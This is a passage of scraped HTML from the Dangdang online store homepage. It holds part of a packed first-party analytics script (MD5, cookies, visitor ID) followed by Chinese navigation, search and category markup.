x[i+11],10,-2X);c=l.A(c,d,a,b,x[i+2],15,2Y);b=l.A(b,c,d,a,x[i+9],21,-2Z);a=l.C(a,f);b=l.C(b,g);c=l.C(c,h);d=l.C(d,j)}u V(a,b,c,d)},J:p(q,a,b,x,s,t){u l.C(l.1m(l.C(l.C(a,q),l.C(x,t)),s),b)},v:p(a,b,c,d,x,s,t){u l.J((b&c)|((~b)&d),a,b,x,s,t)},w:p(a,b,c,d,x,s,t){u l.J((b&d)|(c&(~d)),a,b,x,s,t)},z:p(a,b,c,d,x,s,t){u l.J(b^c^d,a,b,x,s,t)},A:p(a,b,c,d,x,s,t){u l.J(c^(b|(~d)),a,b,x,s,t)},1n:p(a){o b=V();o c=(1<<l.F)-1;P(o i=0;i<a.B*l.F;i+=l.F)b[i>>5]|=(a.30(i/l.F)&c)<<(i%32);u b},C:p(x,y){o a=(x&W)+(y&W);o b=(x>>16)+(y>>16)+(a>>16);u(b<<16)|(a&W)},1m:p(a,b){u(a<<b)|(a>>>(32-b))},1o:p(s){u l.1i(l.1l(l.1n(s),s.B*l.F))}};k.X={1p:p(a){o b=Y(a)+"=",Q=K.L.E(b),Z=1q;r(Q>-1){o c=K.L.E(";",Q);r(c==-1){c=K.L.B}Z=31(K.L.18(Q+b.B,c))}u Z},19:p(a,b,c,d,e,f){o g=Y(a)+"="+Y(b);r(c 33 N){g+="; 34="+c.36()}r(d){g+="; 37="+d}r(e){g+="; 38="+e}r(f){g+="; 39"}K.L=g},3a:p(a,b,c,d){l.19(a,"",G N(0),b,c,d)}};k.3b={3c:p(a){o b=G 3d();r(a.E("?")>0){o c=a.18(a.E("?")+1);r(c.E("#")>0){c=c.18(0,c.E("#"))}o d=c.1a("&");P(o i=0;i<d.B;i++){b[d[i].1a("=")[0]]=d[i].1a("=")[1]}}u b}};k.3e=p(a,b,c){r(a.1r){a.1r(b,c,1s)}R r(a.1t){a.1t("T"+b,c)}R{a["T"+b]=c}};k.3f=p(a,b,c){r(a.1u){a.1u(b,c,1s)}R r(a.1v){a.1v("T"+b,c)}R{a["T"+b]=1q}};k.3g=p(x){o a=3h(x);r(3i(a)){u 0.1w}o a=I.3j(x*1x)/1x;o b=a.3k();o c=b.E(\'.\');r(c<0){c=b.B;b+=\'.\'}3l(b.B<=c+2){b+=\'0\'}u b};k.1y=p(){o n=G N();o y=n.3m()+\'\';o m=n.3n()+1;r(m<10)m="0"+m;o d=n.3o();r(d<10)d="0"+d;o H=n.3p();r(H<10)H="0"+H;o M=n.3q();r(M<10)M="0"+M;o S=n.3r();r(S<10)S="0"+S;o a="1w"+n.3s();a=a.1b(a.B-3,3);o b=I.1z(1A+I.1B()*1C);o c=I.1z(1A+I.1B()*1C);o e=y+m+d+H+M+S+a+b+c+k.1e;o f=k.1g.1o(e);f=k.1D(f);u y+m+d+H+M+S+a+f+b+c};k.1D=p(a){o b=3t(a.1b(0,8),16);o c=3u(b).1b(0,6);o d=c.B;r(d<6){c+=k.1E(\'0\',I.3v(6-d))}u c};k.1E=p(a,b){u G V(b+1).3w(a)};k.1F=p(){o t=G N();u t.3x()};k.1G=p(){k.D=k.X.1p("D");r(1c k.D==\'O\'||!/^\\d{35}$/.3y(k.D)){o a=G N(3z,1,1);k.D=k.1y();k.X.19("D",k.D,a,"/",k.1d)}k.1f=k.1F()};U=k;U.1G()})()}',62,222,'|||||||||||||||||||||this|||var|function||if|||return|md5_ff|md5_gg|||md5_hh|md5_ii|length|safe_add|__permanent_id|indexOf|chrsz|new||Math|md5_cmn|document|cookie||Date|undefined|for|cookieStart|else||on|ddclick_head_functions|Array|0xFFFF|CookieUtil|encodeURIComponent|cookieValue|||||||||substring|set|split|substr|typeof|__cookieDomain|__ddclick_hash_key|__timestap|Md5Util|hexcase|binl2hex|charAt|0xF|core_md5|bit_rol|str2binl|hex_md5|get|null|addEventListener|false|attachEvent|removeEventListener|detachEvent|00|100|createPermanentID|floor|100000|random|900000|formatHashCode|str_repeat|initTime|init|ddclick_page_tracker|dangdang|com|DDClick521|b64pad|0123456789ABCDEF|0123456789abcdef|0x80|64|1732584193|271733879|1732584194|271733878|680876936|389564586|606105819|1044525330|176418897|1200080426|||||1473231341|45705983|1770035416|1958414417|42063|1990404162|1804603682|40341101|1502002290|1236535329|165796510|1069501632|643717713|373897302|701558691|38016083|660478335|405537848|568446438|1019803690|187363961|1163531501|1444681467|51403784|1735328473|1926607734|378558|2022574463|1839030562|35309556|1530992060|1272893353|155497632|1094730640|681279174|358537222|722521979|76029189|640364487|421815835|530742520|995338651|198630844|1126891415|1416354905|57434055|1700485571|1894986606|1051523|2054922799|1873313359|30611744|1560198380|1309151649|145523070|1120210379|718787259|343485551|charCodeAt|decodeURIComponent||instanceof|expires||toGMTString|path|domain|secure|unset|URLUtil|getKeyValueArray|Object|addEventHandler|removeEventHandler|changeTwoDecimal|parseFloat|isNaN|round|toString|while|getFullYear|getMonth|getDate|getHours|getMinutes|getSeconds|getMilliseconds|parseInt|String|abs|join|getTime|test|2020'.split('|'),0,{}))</script>
<script type="text/javascript">
function is_narrow(){
    var datanav="";
    if(screen.width < 1210){
       datanav='<li ><a name="nav1" href="http://t.dangdang.com/2017_yearcelebration" target="_blank">全场100减50</a><span class="icon_n"><img src="http://img62.ddimg.cn/upload_img/00444/tupian/hothotbiaoqian.png" alt="" /></span></li><li ><a name="nav1" href="http://book.dangdang.com/" target="_blank">图书</a></li><li ><a name="nav1" href="http://e.dangdang.com/" target="_blank">电子书</a></li><li ><a name="nav1" href="http://e.dangdang.com/new_original_index_page.html" target="_blank">网络文学</a></li><li ><a name="nav1" href="http://fashion.dangdang.com/" target="_blank">服装</a></li><li ><a name="nav1" href="http://fashion.dangdang.com/sports" target="_blank">运动户外</a></li><li ><a name="nav1" href="http://baobao.dangdang.com/" target="_blank">孕婴童</a></li><li ><a name="nav1" href="http://living.dangdang.com/ " target="_blank">家居</a></li><li ><a name="nav1" href="http://art.dangdang.com/index#component_2735524" target="_blank">创意文具</a></li><li ><a name="nav1" href="http://food.dangdang.com" target="_blank">食品</a></li><li ><a name="nav1" href="http://3c.dangdang.com/ " target="_blank">电器城</a></li>';
    }else{
    datanav='<li ><a name="nav1" href="http://t.dangdang.com/2017_yearcelebration" target="_blank">全场100减50</a><span class="icon_n"><img src="http://img62.ddimg.cn/upload_img/00444/tupian/hothotbiaoqian.png" alt="" /></span></li><li ><a name="nav1" href="http://book.dangdang.com/" target="_blank">图书</a></li><li ><a name="nav1" href="http://e.dangdang.com/" target="_blank">电子书</a></li><li ><a name="nav1" href="http://e.dangdang.com/new_original_index_page.html" target="_blank">网络文学</a></li><li ><a name="nav1" href="http://fashion.dangdang.com/" target="_blank">服装</a></li><li ><a name="nav1" href="http://fashion.dangdang.com/sports" target="_blank">运动户外</a></li><li ><a name="nav1" href="http://baobao.dangdang.com/" target="_blank">孕婴童</a></li><li ><a name="nav1" href="http://living.dangdang.com/ " target="_blank">家居</a></li><li ><a name="nav1" href="http://art.dangdang.com/index#component_2735524" target="_blank">创意文具</a></li><li ><a name="nav1" href="http://food.dangdang.com" target="_blank">食品</a></li><li ><a name="nav1" href="http://3c.dangdang.com/ " target="_blank">电器城</a></li>';
    }
    return datanav;
}
</script>


<div id="hd">
<div id="tools">
<div class="tools">
    <div class="ddnewhead_operate" dd_name="顶链接">
        <ul class="ddnewhead_operate_nav">
        <li class="ddnewhead_cart"><a href="javascript:AddToShoppingCart(0);" name="购物车" dd_name="购物车"><i class="icon_card"></i>购物车<b id="cart_items_count_head"></b></a></li>
        <li><a target="_blank" href="http://myhome.dangdang.com/myOrder" name="我的订单" dd_name="我的订单" rel="nofollow">我的订单<b id="unpaid_num" style="color:#ff2832;font:bold 12px Arial;"></b></a></li>
    <li><a target="_blank" href="http://e.dangdang.com/touch/special/goldenIP/essays.html" name="mydd_7" dd_name="小说投稿">小说投稿</a></li>
        <li class="dang_erweima">
          <a target="_blank" href="http://t.dangdang.com/20130220_ydmr" id="a_phonechannel" onmouseover="showgaoji('a_phonechannel','__ddnav_sjdd');" onmouseout="hideotherchannel('a_phonechannel','__ddnav_sjdd');" class="menu_btn"><i class="icon_tel"></i>手机当当</a>
          <div class="tel_pop" style="display: none;" id="__ddnav_sjdd" onmouseover="showgaoji('a_phonechannel','__ddnav_sjdd');" onmouseout="hideotherchannel('a_phonechannel','__ddnav_sjdd');">
                <a target="_blank" href="http://t.dangdang.com/20130220_ydmr" class="title"><i class="icon_tel"></i>手机当当</a><i class="title_shadow"></i>
                <div class="tel_pop_box clearfix">
                    <div class="tel_pop_box_li"><a href="http://t.dangdang.com/20130220_ydmr" dd_name="手机二维码" target="_blank"><span>当当购物客户端</span><img src="http://img63.ddimg.cn/upload_img/00550/webpagetop/shopingapp.png"><span class="text">下载购物APP<br>手机端1元秒</span></a></div>
                    <div class="tel_pop_box_li"><a href="http://t.dangdang.com/20140107_5pz1" dd_name="手机二维码" target="_blank"><span>当当读书客户端</span><img src="http://img62.ddimg.cn/upload_img/00550/webpagetop/readapp.png"><span class="text">万本电子书<br>免费读</span></a></div>
                </div>
          </div>
        </li>
        <li class="my_dd"><a class="menu_btn" target="_blank" href="http://myhome.dangdang.com/" name="我的当当" dd_name="我的当当" id="a_myddchannel" onmouseover="showgaoji('a_myddchannel','__ddnav_mydd')" onmouseout="hideotherchannel('a_myddchannel','__ddnav_mydd');">我的当当</a>
            <ul class="ddnewhead_gcard_list" id="__ddnav_mydd" onmouseover="showgaoji('a_myddchannel','__ddnav_mydd')" onmouseout="hideotherchannel('a_myddchannel','__ddnav_mydd');">      
                <li><a target="_blank" href="http://point.dangdang.com/index.html?ref=my-0-L" name="mydd_4" dd_name="积分抵现" rel="nofollow">积分抵现</a></li>
                <li><a target="_blank" href="http://wish.dangdang.com/wishlist/cust_wish_list.aspx?ref=my-0-L" name="mydd_1" dd_name="我的收藏" rel="nofollow">我的收藏</a></li>
                <li><a target="_blank" href="http://newaccount.dangdang.com/payhistory/mybalance.aspx" name="mydd_5" dd_name="我的余额" rel="nofollow">我的余额</a></li>
                <li><a target="_blank" href="http://comment.dangdang.com/comment" name="mydd_4" dd_name="我的评论" rel="nofollow">我的评论</a></li>
                <li><a target="_blank" href="http://newaccount.dangdang.com/payhistory/mycoupon.aspx" name="mydd_2" dd_name="礼券/礼品卡" rel="nofollow">礼券/礼品卡</a></li>
        <li><a target="_blank" href="http://e.dangdang.com/ebook/listUserEbooks.do" name="mydd_6" dd_name="电子书架">电子书架</a></li>
            </ul>
        </li>
        <li><a class="menu_btn" href="javascript:void(0);" style="cursor:default;" name="qycg" dd_name="企业采购" id="a_qycgchannel" onmouseover="showgaoji('a_qycgchannel','__ddnav_qycg');" onmouseout="hideotherchannel('a_qycgchannel','__ddnav_qycg');">企业采购</a>
            <ul class="ddnewhead_gcard_list" id="__ddnav_qycg" onmouseover="showgaoji('a_qycgchannel','__ddnav_qycg');" onmouseout="hideotherchannel('a_qycgchannel','__ddnav_qycg');">
                <li><a target="_blank" href="http://giftcard.dangdang.com/giftcardCompany" name="qycg_1" dd_name="大宗采购">大宗采购</a></li>
                <li><a target="_blank" href="http://giftcard.dangdang.com/" name="qycg_2" dd_name="礼品卡采购">礼品卡采购</a></li>
                <li><a target="_blank" href="http://newaccount.dangdang.com/payhistory/mymoney.aspx" name="gqycg_3" dd_name="礼品卡激活" rel="nofollow">礼品卡激活</a></li>
                <li><a target="_blank" href="http://help.dangdang.com/details/page24" name="qycg_4" dd_name="礼品卡使用">礼品卡使用</a></li>
                <li><a target="_blank" href="http://b2b.dangdang.com" name="qycg_5" dd_name="3C数码团购">3C数码团购</a></li>
            </ul>
        </li>
        <li class="hover "><a class="menu_btn" href="javascript:void(0);" style="cursor:default;" name="ddkf_0" dd_name="客户服务" id="a_bzzxchannel" onmouseover="showgaoji('a_bzzxchannel','__ddnav_bzzx');" onmouseout="hideotherchannel('a_bzzxchannel','__ddnav_bzzx');">客户服务</a>
            <ul class="ddnewhead_gcard_list" id="__ddnav_bzzx" onmouseover="showgaoji('a_bzzxchannel','__ddnav_bzzx');" onmouseout="hideotherchannel('a_bzzxchannel','__ddnav_bzzx');">
                <li><a target="_blank" href="http://help.dangdang.com/index" name="ddkf_2" dd_name="帮助中心">帮助中心</a></li>
        <li><a target="_blank" href="http://return.dangdang.com/reverseapplyselect.aspx" name="ddkf_3" dd_name="自助退换货">自助退换货</a></li>
               <li><a target="_blank" href="http://order.dangdang.com/InvoiceApply/InvoiceOnlineReissue.aspx" name="tsjy_2" dd_name="自助发票" rel="nofollow">自助发票</a></li>
                <li><a target="_blank" href="http://help.dangdang.com/details/page206" name="ddkf_4" dd_name="联系客服">联系客服</a></li>
                <li><a target="_blank" href="http://help.dangdang.com/email_contact" name="tsjy_1" dd_name="我要投诉" rel="nofollow">我要投诉</a></li>
                <li><a target="_blank" href="http://help.dangdang.com/email_contact" name="tsjy_2" dd_name="意见建议" rel="nofollow">意见建议</a></li>
            </ul>
        </li>
        </ul>
        <div class="new_head_znx" id="znx_content" style="display:none;"></div>
        <div class="ddnewhead_welcome" display="none;">
            <span id="nickname"><span class="hi hi_none">欢迎光临当当，请</span><a href="https://login.dangdang.com/signin.aspx?returnurl=http%3A//www.dangdang.com/" class="login_link">登录</a><a href="https://login.dangdang.com/Register.aspx">免费注册</a></span>
            <div class="tel_pop" style="display:none" id="__ddnav_sjdd"  onmouseover="showgaoji('a_phonechannel','__ddnav_sjdd');" onmouseout="hideotherchannel('a_phonechannel','__ddnav_sjdd');">
                <a target="_blank" href="http://t.dangdang.com/20130220_ydmr" class="title"><i class="icon_tel"></i>手机当当</a><i class="title_shadow"></i>
                <ul class="tel_pop_box">
                    <li><a href="http://t.dangdang.com/20130220_ydmr" dd_name="手机二维码"><span>当当手机客户端</span><img src="http://img3.ddimg.cn/00363/doc/erweima2.png"><span class="text">随手查订单<br>随时享优惠</span></a></li>
                </ul>
            </div>
        </div>
       <div class="ddnewhead_area">
            <a href="javascript:void(0);" id="area_one" class="ddnewhead_area_a" onmouseover="show_area_list();" onmouseout="hidden_area_list();">送至：<span id="curent_area"></span></a>
            <ul class="ddnewhead_area_list" style="display: none;" id="area_list" onmouseover="this.style.display='block';" onmouseout="this.style.display='none';">
                <li><a href="javascript:void(0);" onclick="change_area('111','北京')" num="111">北京</a></li>
                <li><a href="javascript:void(0);" onclick="change_area('112','天津')" num="112">天津</a></li>   
                <li><a href="javascript:void(0);" onclick="change_area('113','河北')" num="113">河北</a></li>
                <li><a href="javascript:void(0);" onclick="change_area('114','山西')" num="114">山西</a></li>    
                <li><a href="javascript:void(0);" onclick="change_area('115','内蒙古')" num="115">内蒙古</a></li>  
                <li><a href="javascript:void(0);" onclick="change_area('121','辽宁')" num="121">辽宁</a></li>        
                <li><a href="javascript:void(0);" onclick="change_area('122','吉林')" num="122">吉林</a></li>        
                <li><a href="javascript:void(0);" onclick="change_area('123','黑龙江')" num="123">黑龙江</a></li>
                <li><a href="javascript:void(0);" onclick="change_area('131','上海')" num="131">上海</a></li>  
                <li><a href="javascript:void(0);" onclick="change_area('132','江苏')" num="132">江苏</a></li>  
                <li><a href="javascript:void(0);" onclick="change_area('133','浙江')" num="133">浙江</a></li>
                <li><a href="javascript:void(0);" onclick="change_area('134','安徽')" num="134">安徽</a></li>        
                <li><a href="javascript:void(0);" onclick="change_area('135','福建')" num="135">福建</a></li>  
                <li><a href="javascript:void(0);" onclick="change_area('136','江西')" num="136">江西</a></li>  
                <li><a href="javascript:void(0);" onclick="change_area('137','山东')" num="137">山东</a></li>   
                <li><a href="javascript:void(0);" onclick="change_area('141','河南')" num="141">河南</a></li>       
                <li><a href="javascript:void(0);" onclick="change_area('142','湖北')" num="142">湖北</a></li>  
                <li><a href="javascript:void(0);" onclick="change_area('143','湖南')" num="143">湖南</a></li>       
                <li><a href="javascript:void(0);" onclick="change_area('144','广东')" num="144">广东</a></li>        
                <li><a href="javascript:void(0);" onclick="change_area('145','广西')" num="145">广西</a></li>
                <li><a href="javascript:void(0);" onclick="change_area('146','海南')" num="146">海南</a></li>
                <li><a href="javascript:void(0);" onclick="change_area('150','重庆')" num="150">重庆</a></li>        
                <li><a href="javascript:void(0);" onclick="change_area('151','四川')" num="151">四川</a></li>           
                <li><a href="javascript:void(0);" onclick="change_area('152','贵州')" num="152">贵州</a></li>        
                <li><a href="javascript:void(0);" onclick="change_area('153','云南')" num="153">云南</a></li>
                <li><a href="javascript:void(0);" onclick="change_area('154','西藏')" num="154">西藏</a></li>   
                <li><a href="javascript:void(0);" onclick="change_area('161','陕西')" num="161">陕西</a></li>        
                <li><a href="javascript:void(0);" onclick="change_area('162','甘肃')" num="162">甘肃</a></li>        
                <li><a href="javascript:void(0);" onclick="change_area('163','青海')" num="163">青海</a></li> 
                <li><a href="javascript:void(0);" onclick="change_area('164','宁夏')" num="164">宁夏</a></li>
                <li><a href="javascript:void(0);" onclick="change_area('165','新疆')" num="165">新疆</a></li>        
                <li><a href="javascript:void(0);" onclick="change_area('171','台湾')" num="171">台湾</a></li>        
                <li><a href="javascript:void(0);" onclick="change_area('172','香港')" num="172">香港</a></li>        
                <li><a href="javascript:void(0);" onclick="change_area('173','澳门')" num="173">澳门</a></li>        
                <li><a href="javascript:void(0);" onclick="change_area('174','钓鱼岛')" num="174">钓鱼岛</a></li>                
            </ul>
        </div>
    </div>
</div>
</div>
<div id="header_end"></div>
<!--CreateDate  2017-06-01 16:30:01--><div style="position:relative;" class="logo_line_out">
<div class="logo_line" dd_name="搜索框">
    <div class="logo"><img src="http://img60.ddimg.cn/upload_img/00178/yt/618nzq.gif" usemap="#logo_link"/>
                         <map name="logo_link" id="logo_link" dd_name="logo区"><area shape="rect" coords="0,18,200,93" href="http://www.dangdang.com" title="当当" onfocus="this.blur();">
                         <area shape="rect" coords="200,18,320,93" href="http://t.dangdang.com/2017_yearcelebration" title="" target="_blank" onfocus="this.blur();"></map></div>
    <div class="search">
        <form action="http://search.dangdang.com" name="searchform"  id="form_search_new" onsubmit="return searchsubmit();"  method="GET">
            <label  for="key_S" class="label_search" id="label_key" onclick="this.style.color='rgb(255, 255, 255)';" style="visibility: visible; color: rgb(102, 102, 102);" >全场图书每100减50</label>
            <input type="text" class="text gray"  name="key" ID="key_S" autocomplete="off" onclick="key_onclick(event);" onfocus="key_onfocus(event);"  onblur="key_onblur();" onbeforepaste="onpaste_search();"/><a href="javascript:void(0);" onclick="clearkeys();" class="del-keywords"></a><span class="select"  onmouseover="allCategoryShow();"  onmouseleave="allCategoryHide();" onmouseout='if("\v"!="v"){ allCategoryHide();}'><span id="Show_Category_Name" dd_name="全部分类">全部分类</span><span class="icon"></span>
                <div id="search_all_category" class="select_pop" style="height:0px;padding: 0px;border-width: 0px;" dd_name="搜索分类">
                    <a href="javascript:void(0);" onclick="selectCategory('',this);" ><span id="Show_Category_Name" dd_name="全部分类">全部分类</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory('100000',this);" dd_name="尾品汇"><span>尾品汇</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory('01.00.00.00.00.00',this);" dd_name="图书"><span>图书</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory('98.00.00.00.00.00',this);" dd_name="电子书"><span>电子书</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory('03.00.00.00.00.00',this);" dd_name="音像"><span>音像</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory('05.00.00.00.00.00',this);" dd_name="影视"><span>影视</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4002074,this);" dd_name="时尚美妆"><span>时尚美妆</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4001940,this);" dd_name="母婴用品"><span>母婴用品</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4002061,this);" dd_name="玩具"><span>玩具</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4004866,this);" dd_name="孕婴服饰"><span>孕婴服饰</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4004344,this);" dd_name="童装童鞋"><span>童装童鞋</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4003900,this);" dd_name="家居日用"><span>家居日用</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4003760,this);" dd_name="家具装饰"><span>家具装饰</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4003844,this);" dd_name="服装"><span>服装</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4003872,this);" dd_name="鞋"><span>鞋</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4001829,this);" dd_name="箱包皮具"><span>箱包皮具</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4003639,this);" dd_name="手表饰品"><span>手表饰品</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4003728,this);" dd_name="运动户外"><span>运动户外</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4002429,this);" dd_name="汽车用品"><span>汽车用品</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4002145,this);" dd_name="食品"><span>食品</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4006497,this);" dd_name="手机通讯"><span>手机通讯</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4003613,this);" dd_name="数码影音"><span>数码影音</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4003819,this);" dd_name="电脑办公"><span>电脑办公</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4007241,this);" dd_name="大家电"><span>大家电</span></a>
                                        <a href="javascript:void(0);" onclick="selectCategory(4001001,this);" dd_name="家用电器"><span>家用电器</span></a>
                                    </div>
            </span>
            <input type="hidden" id="default_key" value="全场图书每100减50"/>
            <input type="submit" id="search_btn" dd_name="搜索按钮"  style="display:none"/>
            <input id="SearchFromTop" style="display:none" type="hidden" name="SearchFromTop" value="1"/>
            <input type="button" id="suggest_product_btn" name="suggestproduct_btn"  style="display:none" onclick="void(0)"/>
            <input type="button" id="suggest_class_btn" name="suggestclass_btn"  style="display:none" onclick="void(0)"/>
            <input type="submit" id="suggest_searchkey_btn" name="suggestsearchkey_btn"  style="display:none" dd_name="搜索按钮"/>
            <input type="hidden" id="catalog_S" name="catalog" value="" >
            <input type="button" class="button" dd_name="搜索按钮" onclick="javascript:document.getElementById('search_btn').click();"/>
        </form>
    </div>
    <div class="search_bottom">
        <div class="search_hot"><a href="http://www.dangdang.com/sales/brands/" target="_blank" style="margin-right: 0;">热搜</a>: <a href="http://search.dangdang.com/?key=%C2%FA199%BC%F5100" name="hotword" target="_blank">满199减100</a><a href="http://search.dangdang.com/?key=100%BC%F550" name="hotword" target="_blank">100减50</a><a href="http://search.dangdang.com/?key=%D0%A1%C8%CB%CA%E9100" name="hotword" target="_blank">小人书100</a><a href="http://search.dangdang.com/?key=%D4%CB%B6%AF%BB%A7%CD%E2%C1%AA%BA%CF" name="hotword" target="_blank">运动户外联合</a><a href="http://search.dangdang.com/?key=%CD%AF%CA%E9%C2%FA100%BC%F550" name="hotword" target="_blank">童书满100减50</a><a href="http://search.dangdang.com/?key=%CE%B2%C6%B7%BB%E3" name="hotword" target="_blank">尾品汇</a></div>
        <a href="http://search.dangdang.com/advsearch" class="search_advs" target="_blank" name="ddnav_adv_s" dd_name="高级搜索">高级搜索</a>
    </div>
    <div id="suggest_key" class="suggest_key" style="display:none;" ></div>
    <div class="ddnew_cart"><a href="javascript:AddToShoppingCart(0);" name="购物车" dd_name="购物车"><i class="icon_card"></i>购物车<b id="cart_items_count"></b></a></div>
    <div class="ddnew_order"><a target="_blank" href="http://orderb.dangdang.com/myallorders.aspx" name="我的订单" dd_name="我的订单" rel="nofollow">我的订单<b id="unpaid_num" style="color:#ff2832;font:bold 12px Arial;"></b></a></div>
</div>
</div>    <div class="nav_top" dd_name="一级导航条">
        <ul>
        <li class="all"><a href="http://category.dangdang.com/?ref=www-0-C" dd_name="全部商品分类" target="_blank">全部商品分类</a></li>
        <script language="javascript">document.write(is_narrow());</script>
        </ul>
    </div>
</div>
<script type="text/javascript">var newsuggesturl = "http://schprompt.dangdang.com/suggest_new.php?";</script>


<script language="javascript">
    var width = 1; var narrow = 0;
</script>
<script type="text/javascript" src="http://www.dangdang.com/Standard/Framework/Extend/hosts/js/pagetop.js?20170601" ></script>

        
<div  id="bd"   name=15639  cvid="20181"  ><div  class="con bd_body" name=15640  ><div  class=" "    name="m3208531_pid0_t15055" dd_name="顶部广告A版"   hvid='19265'   component_map_id="3208531" ddt-area="3208531" ddt-expose="on" ><div id='component_3208531'></div>
                    <!-- use cache--><div id='component_3208531'></div><div id="ad_cpt_12284" style="position: relative;left:0px;top:0px;display: none;"></div>
<div id="ad_cpx_36080001" style="position: relative;left:0px;top:0px;display: none;"></div>
<div id="ad_cpx_12287" style=" position: absolute;left:0px;top:0px;display: none;"></div>
<script  type="text/javascript">
var ad_cpx_one = '12284';
var ad_cpx_two ='36080001';
var ad_cpx_three ='12287';
</script>
</div><div  class="new_pro "  id="block1"   name="m3208532_pid0_t15651" dd_name="首屏大模块A版"   hvid='20221'   component_map_id="3208532" ddt-area="3208532" ddt-expose="on" ><div id='component_3208532'></div>
                    <!-- use cache--><div id='component_3208532'></div><div  class="con home_first_screen"  name="m3208532_pid0_t15652"    ><div class="home_nav_l" dd_name="左侧分类" ><div class="new_pub_nav_box" dd_name="左侧分类导航">
    <span class="new_pub_line_a"></span>
    <span class="new_pub_line_b"></span>
    <div class="new_pub_nav_shadow" id="menu_list">
        <ul class="new_pub_nav" id="menulist_content">
                        <li class="n_b first"  dd_name="图书童书"  id="li_label_1" data-submenu-id="__ddnav_sort1" data_index="1" data_key="34102" data_type="'goods'" >
                <span class="nav" id="categoryh_1">
                    <a name="newcate1" dd_name="图书"  id="cate_34242" href="http://book.dangdang.com" target="_blank">图书</a>、<a name="newcate1" dd_name="童书"  id="cate_34252" href="http://book.dangdang.com/children?ref=book-01-A" target="_blank">童书</a></span><span class="sign"></span>
            </li>
                        <li class="n_b"  dd_name="电子书网络文学"  id="li_label_2" data-submenu-id="__ddnav_sort2" data_index="2" data_key="56262" data_type="'book'" >
                <span class="nav" id="categoryh_2">
                    <a name="newcate2" dd_name="电子书"  id="cate_56263" href="http://e.dangdang.com/index_page.html" target="_blank">电子书</a>、<a name="newcate2" dd_name="网络文学"  id="cate_56484" href="http://e.dangdang.com/new_original_index_page.html" target="_blank">网络文学</a></span><span class="sign"></span>
            </li>
                        <li class="n_b"  dd_name="创意文具当当拍卖"  id="li_label_3" data-submenu-id="__ddnav_sort3" data_index="3" data_key="55442" data_type="'goods'" >
                <span class="nav" id="categoryh_3">
                    <a name="newcate3" dd_name="创意文具"  id="cate_55469" href="http://art.dangdang.com/" target="_blank">创意文具</a>、<a name="newcate3" dd_name="当当拍卖"  id="cate_56020" href="http://paimai.dangdang.com/" target="_blank">当当拍卖</a></span><span class="sign"></span>
            </li>
                        <li class="n_b"  dd_name="服饰内衣"  id="li_label_4" data-submenu-id="__ddnav_sort4" data_index="4" data_key="34202" data_type="'goods'" >
                <span class="nav" id="categoryh_4">
                    <a name="newcate4" dd_name="服饰"  id="cate_45522" href="http://fashion.dangdang.com/" target="_blank">服饰</a>、<a name="newcate4" dd_name="内衣"  id="cate_53062" href="http://fashion.dangdang.com/underwear" target="_blank">内衣</a></span><span class="sign"></span>
            </li>
                        <li class="n_b"  dd_name="鞋靴箱包"  id="li_label_5" data-submenu-id="__ddnav_sort5" data_index="5" data_key="34212" data_type="'goods'" >
                <span class="nav" id="categoryh_5">
                    <a name="newcate5" dd_name="鞋靴"  id="cate_45532" href="http://fashion.dangdang.com/shoes" target="_blank">鞋靴</a>、<a name="newcate5" dd_name="箱包"  id="cate_53072" href="http://fashion.dangdang.com/bags" target="_blank">箱包</a></span><span class="sign"></span>
            </li>
                        <li class="n_b"  dd_name="运动户外"  id="li_label_6" data-submenu-id="__ddnav_sort6" data_index="6" data_key="34232" data_type="'goods'" >
                <span class="nav" id="categoryh_6">
                    <a name="newcate6" dd_name="运动户外"  id="cate_45552" href="http://fashion.dangdang.com/sports" target="_blank">运动户外</a></span><span class="sign"></span>
            </li>
                        <li class="n_b"  dd_name="孕婴童"  id="li_label_7" data-submenu-id="__ddnav_sort7" data_index="7" data_key="34112" data_type="'goods'" >
                <span class="nav" id="categoryh_7">
                    <a name="newcate7" dd_name="孕"  id="cate_35772" href="http://mama.dangdang.com/" target="_blank">孕</a>、<a name="newcate7" dd_name="婴"  id="cate_35782" href="http://baby.dangdang.com/" target="_blank">婴</a>、<a name="newcate7" dd_name="童"  id="cate_35792" href="http://kids.dangdang.com/" target="_blank">童</a></span><span class="sign"></span>
            </li>
                        <li class="n_b"  dd_name="家居家纺汽车"  id="li_label_8" data-submenu-id="__ddnav_sort8" data_index="8" data_key="34142" data_type="'goods'" >
                <span class="nav" id="categoryh_8">
                    <a name="newcate8" dd_name="家居"  id="cate_38642" href="http://living.dangdang.com/" target="_blank">家居</a>、<a name="newcate8" dd_name="家纺"  id="cate_53032" href="http://living.dangdang.com/textile" target="_blank">家纺</a>、<a name="newcate8" dd_name="汽车"  id="cate_38662" href="http://automobile.dangdang.com/" target="_blank">汽车</a></span><span class="sign"></span>
            </li>
                        <li class="n_b"  dd_name="家具家装康体"  id="li_label_9" data-submenu-id="__ddnav_sort9" data_index="9" data_key="34132" data_type="'goods'" >
                <span class="nav" id="categoryh_9">
                    <a name="newcate9" dd_name="家具"  id="cate_52282" href="http://living.dangdang.com/furniture" target="_blank">家具</a>、<a name="newcate9" dd_name="家装"  id="cate_54045" href="http://living.dangdang.com/decoration" target="_blank">家装</a>、<a name="newcate9" dd_name="康体"  id="cate_54046" href="http://health.dangdang.com/" target="_blank">康体</a></span><span class="sign"></span>
